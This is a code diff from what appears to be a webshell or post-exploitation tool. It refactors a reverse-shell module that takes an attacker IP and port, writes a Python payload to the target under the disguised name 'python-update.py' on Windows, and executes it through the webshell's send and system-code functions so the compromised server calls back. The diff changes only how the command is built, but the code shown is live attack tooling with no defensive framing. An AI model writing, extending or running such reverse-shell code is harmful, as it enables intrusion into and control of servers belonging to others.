@@ -2,7 +2,7 @@ from threading import Thread
 from time import sleep
 
 from libs.config import alias, color, gget
-from libs.myapp import delay_send, has_env, is_windows, send
+from libs.myapp import delay_send, has_env, is_windows, send, get_system_code
 
 
 def get_reverse_php(ip: str, port: str):
@@ -147,8 +147,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
         t.setDaemon(True)
         t.start()
     elif reverse_type == "python":
-        flag = has_env("python")
-        if flag:
+        if has_env("python"):
             python = get_reverse_python(ip, port)
             if is_windows():
                 pyname = "python-update.py"
@@ -159,7 +158,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
                 if not len(text):
                     print(color.red(f"Failed to write file in {upload_tmp_dir if upload_tmp_dir else 'current'} directory."))
                     return
-                t = Thread(target=send, args=(f"system('python {upload_tmp_dir}{pyname}');",))
+                t = Thread(target=send, args=(get_system_code(f"python {upload_tmp_dir}{pyname}"),))
                 t.setDaemon(True)
                 t.start()
                 t2 = Thread(
@@ -168,7 +167,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
                 t2.setDaemon(True)
                 t2.start()
             else:
-                t = Thread(target=send, args=(f'system("{python}");',))
+                t = Thread(target=send, args=(get_system_code(python),))
                 t.setDaemon(True)
                 t.start()
         else:
